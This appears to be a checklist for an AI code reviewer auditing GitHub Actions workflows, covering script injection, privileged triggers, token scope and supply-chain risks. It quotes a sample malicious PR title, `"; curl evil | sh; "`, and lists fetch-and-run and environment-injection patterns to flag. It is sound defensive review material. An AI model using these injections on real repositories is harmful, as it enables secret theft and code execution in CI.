# GitHub Actions lens

Applies to: `.github/workflows/*.y*ml`, `.github/actions/**`.

## Before you start
- Read whole workflow (trigger, top-level `permissions:`/`env:`, `needs:`).
- Note repo visibility, runner (public, self-hosted), cross-workflow/composite calls (`uses: ./.github/...`).
- Trigger trust: fork `pull_request` = read-only, no secrets; `pull_request_target`, `issue_comment`, `workflow_run`, `workflow_dispatch` = base-repo context, secrets, writable token.
- Match build steps to project type (`*.csproj`+`packages.config` vs SDK-style, `package.json`, `go.mod`); check CLAUDE.md pin/allowlist policy.

## Hunt for

### Injection (highest priority)
- Attacker-controlled context in `run:` (`github.event.{pull_request.title|body|head.ref|head.label, issue.title|body, comment.body, review.body, commits.*.message, head_commit.message|author.*, pages.*.page_name}`, `github.head_ref`) - `${{ }}` expands pre-shell: title `"; curl evil | sh; "` runs w/ job secrets. Fix: `env: TITLE: ${{ ... }}` + `"$TITLE"`. Same for outputs derived from untrusted input.
- Same contexts in `actions/github-script` `script:` - pasted into JS; use `process.env`/`context.payload`.
- Untrusted text to `$GITHUB_ENV`/`$GITHUB_PATH`/`$GITHUB_OUTPUT` (`echo "x=${{ ... }}" >> $GITHUB_ENV`, artifact contents) - newline injects `LD_PRELOAD`/`NODE_OPTIONS`/`PATH`.
- `workflow_dispatch`/`workflow_call` string `inputs.*` in `run:` - needs write to trigger, but callers forward untrusted values; matters w/ deploy secrets.

### Dangerous triggers
- `pull_request_target` (or `issue_comment`, `workflow_run` after fork PR) checking out PR code (`ref: ${{ github.event.pull_request.head.sha|head.ref }}`, `refs/pull/*/merge`) then install/build/test/repo script - attacker code gets secrets + write token.
- `issue_comment`/`/command` triggers not checking commenter (`github.event.comment.author_association`, membership) - any commenter starts privileged run.
- `workflow_run` consuming fork-run artifacts (unzip, "PR number" file into privileged step) - attacker-controlled.
- Self-hosted runner on public repo or fork-influenced event - no isolation, persistent state, secrets/network open to PR openers.

### Token scope, secrets, deploy gates
- No `permissions:` at workflow/job level - inherits repo/org default, often read-write; set `permissions: contents: read`.
- `permissions: write-all`, or `contents|packages|pull-requests: write` on build/test jobs; `id-token: write` (cloud OIDC) needs trust policy scoped to repo/branch/environment.
- `secrets: inherit` on `uses:` reusable-workflow call - passes every secret (esp. cross-repo).
- Secrets in workflow/job-level `env:` - every step, third-party actions too, reads them.
- Hardcoded tokens, connection strings, passwords in YAML; secrets on command line (`--password ${{ secrets.X }}`); masking is exact-match, so derived (base64, substring, JSON-embedded) values need `::add-mask::`.
- `actions/checkout` default `persist-credentials` before untrusted/third-party code or artifact upload incl. hidden files - token in `.git/config`.
- Artifact/cache upload of `.env`, `appsettings.*.json`, `.npmrc`, `~/.docker/config.json`, `nuget.config` w/ credentials - any reader downloads them.
- Prod deploy job w/o `environment:` - no required reviewers; secrets repo-wide, not environment-scoped.

### Supply chain
- Third-party `uses: owner/action@v1|@main|@master` (mutable ref) - tag can be repointed (tj-actions/changed-files, 2025); pin 40-char SHA + `# v1.2.3` comment; worse w/ secrets/write token.
- Unknown/look-alike action owner (typosquat) wanting unexplained secrets/write perms.
- `curl ... | bash`, `wget -O- | sh`, `iex (irm ...)`, unpinned `npm i -g x`/`pip install x`/`dotnet tool install -g x` in release/deploy jobs - mutable remote code beside secrets.
- Retired `actions/upload-artifact@v3`, `download-artifact@v3`, `actions/cache@v1|v2` - fail at run time.
- Floating runner labels (`ubuntu-latest`, `windows-latest`) in release pipeline - image migration changes SDKs/tools w/o PR.

### Pipeline logic
- `needs:` naming missing job or cycle; `needs.x.outputs.y` w/o `x` in `needs:` or `outputs:` on `x`.
- Skippable job upstream - dependents skip unless `if: ${{ !cancelled() && needs.x.result == 'success' }}`; deploy silently never runs.
- `if: ${{ expr }} == 'x'` - text outside `${{ }}` makes string truthy, always true; use `if: expr == 'x'`.
- Step outputs as boolean/number (`steps.x.outputs.ok == true`, bare `if: steps.x.outputs.flag`) - strings; `'false'` truthy.
- `if: always()` on cleanup/report - runs on cancel, blocks it; use `!cancelled()`. Report/upload step lacking `always()`/`!cancelled()` skips exactly when tests fail.
- `if:` reading `secrets.*` - unavailable; map to `env:`, test `env.X != ''`.
- Missing `actions/checkout` before source-needing steps; missing `fetch-depth: 0` for GitVersion, MinVer, `git describe`, `git diff origin/main...`, changelog tools (default depth 1); missing `submodules`.
- Commit/tag pushed w/ `GITHUB_TOKEN` expecting another workflow - its events trigger none (except `workflow_dispatch`, `repository_dispatch`); push needs `contents: write`.
- Required check w/ `paths:`/`branches:`/`tags:` filters - skipped workflow leaves check "Pending", blocks non-matching PRs. Invalid: `branches`+`branches-ignore`, `paths`+`paths-ignore` on one event.
- Cron `schedule:` - UTC, default branch only, auto-disabled after 60 days inactivity on public repos.
- Matrix/version strings - unquoted `python-version: 3.10` -> `3.1`; `fail-fast` defaults true, cancels siblings; `include:` entries matching no combination add jobs.
- `upload-artifact@v4` from matrix w/ shared `name:` - 409 (unique per run); use per-leg names + `download-artifact` `pattern`/`merge-multiple`. v4.4+ skips hidden files (`.coverage`, `.next`) w/o `include-hidden-files: true`. Mismatched names or same-job download finds nothing; `if-no-files-found` defaults `warn`, wrong `path` stays green.
- `::set-env`, `::add-path` disabled, `::set-output` deprecated - use `$GITHUB_ENV`, `$GITHUB_PATH`, `$GITHUB_OUTPUT`.
- Bash syntax on Windows runner - default PowerShell; set `shell: bash` or translate `$VAR`, `&&`, `export`; check `\` vs `/` in `cache` `path:`.
- Service container w/o `--health-cmd` - steps start before DB ready. Host `localhost` on runner jobs, service label under `container:`.
- .NET Framework solution (non-SDK csproj, `packages.config`) via `dotnet build` on `ubuntu-latest` - needs Windows runner, `microsoft/setup-msbuild`, `nuget restore`.

### Composite actions and reusable workflows
- Composite `run:` w/o `shell:`; `${{ secrets.X }}` in composite action - `shell:` required, `secrets` unavailable: pass `inputs:`. Outputs need explicit `value:`; action files under `$GITHUB_ACTION_PATH`.
- Renamed/removed/newly required `inputs`, `secrets`, `outputs` on `on: workflow_call` workflow or composite action - grep all callers (`uses: ./.github/workflows/<f>`, `./.github/actions/<d>`, `org/repo/.github/workflows/<f>@ref`); pinned-ref callers survive, `@main` callers break.

### Concurrency and cost (only when it changes behavior)
- Deploy/release workflow w/o `concurrency:`, or `cancel-in-progress: true` on deploy - mid-deploy cancel leaves half-applied release. Deploys queue (`false`); PR builds cancel (`true`).
- Concurrency group w/o `github.ref` (`group: ${{ github.workflow }}`) - all PRs cancel/serialize each other.
- `continue-on-error: true` on build, test, security scan, deploy gate - failures go green.
- Windows (2x)/macOS (10x) minutes on private repos for Linux-capable work; large artifacts at default 90-day retention; matrix fan-out on every push w/o `paths:` filter.

## Don't flag
- Non-attacker contexts (`github.sha`, `run_id`, `repository`, `runner.os`, static `matrix.*`); untrusted ones via `env:` as quoted `"$VAR"` (`eval "$VAR"`, `bash -c "$VAR"`, unquoted `$VAR` as command still inject).
- First-party `actions/*`, `github/*` on version tags, org-internal actions (unless CLAUDE.md demands SHA pins); version-commented SHA pins (Dependabot-managed).
- `pull_request_target` jobs never checking out/running PR code or interpolating untrusted fields (labelers, comment bots).
- Write permissions on jobs that really publish, deploy, tag or comment (check steps need them).
- Obscure/low-star action w/o secrets or write token.
- Missing timeouts, caching, concurrency, path filters on short, rarely-run workflows (`workflow_dispatch`, release-only); micro-optimizations; YAML order, naming, style.

## Typical light
- 🔴 PR code run under privileged trigger w/ secrets/write token; untrusted `${{ }}` in `run:`/`github-script` w/ secrets/write token; hardcoded/echoed credentials; deploy broken/skipped; deploy gate/`environment:` removed; deploy w/o `concurrency:` or w/ `cancel-in-progress: true` (half-applied release); `continue-on-error` on a real gate (a check that can't fail); `workflow_call` break; required check behind `paths:`; run broken by missing `fetch-depth: 0`/`shell:` or an artifact v4 name clash; steps, secrets or paths still pointing to what the PR renamed or removed.
- 🟡 Missing top-level `permissions:`; `write-all`/excess scopes; `secrets: inherit`; unpinned third-party action (worse w/ secrets); `curl | sh`; default `persist-credentials` before risky steps; floating runner label in release.
- 🟢 Missing `timeout-minutes`, caching, `--no-restore`/`--no-build`, Release config; oversized runner; jobs mergeable into matrix/reusable workflow.
